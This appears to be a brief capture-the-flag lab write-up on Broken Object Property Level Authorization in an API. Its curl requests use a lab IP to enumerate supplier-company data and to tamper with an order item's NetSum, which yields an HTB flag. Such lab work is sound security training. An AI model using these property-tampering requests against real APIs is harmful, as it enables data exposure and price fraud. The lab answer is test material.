# Broken Object Property Level Authorization

```json
{
  "roles": [
    "Suppliers_Get",
    "Suppliers_GetAll",
    "SupplierCompanies_Get",
    "SupplierCompanies_GetAll"
  ]
}
```

```bash
curl -X 'GET' 'http://94.237.63.111:30334/api/v1/supplier-companies' -H 'accept: application/json' -H 'Authorization: Bearer <REDACTED_JWT>' | jq
```

____

```json
{
  "roles": [
    "CustomerOrders_GetByID",
    "CustomerOrders_Create",
    "CustomerOrderItems_Get",
    "CustomerOrderItems_Create"
  ]
}
```

```bash
curl -X 'POST' 'http://94.237.63.111:30334/api/v1/customers/orders' -H 'accept: application/json' -H 'Authorization: Bearer <REDACTED_JWT>' -H 'Content-Type: application/json' -d '{ "Date": "2024-09-30" }'
```

```json
{
  "id": "5c3e3ccf-3103-490f-b6f3-23d8ec8601fe"
}
```

```bash
curl -X 'POST' 'http://94.237.63.111:30334/api/v1/customers/orders/items' -H 'accept: application/json' -H 'Authorization: Bearer <REDACTED_JWT>' -H 'Content-Type: application/json' -d '{ "OrderID": "5c3e3ccf-3103-490f-b6f3-23d8ec8601fe", "OrderItems": [ { "ProductID": "3d9bd0d7-a60e-424f-b286-8f2f1bff6eda", "Quantity": 1, "NetSum": 1 } ] }'
```

```json
{
  "SuccessStatus": true,
  "Message": "HTB{4d86794f82046e465ca29d91bdbe5bca}"
}
```
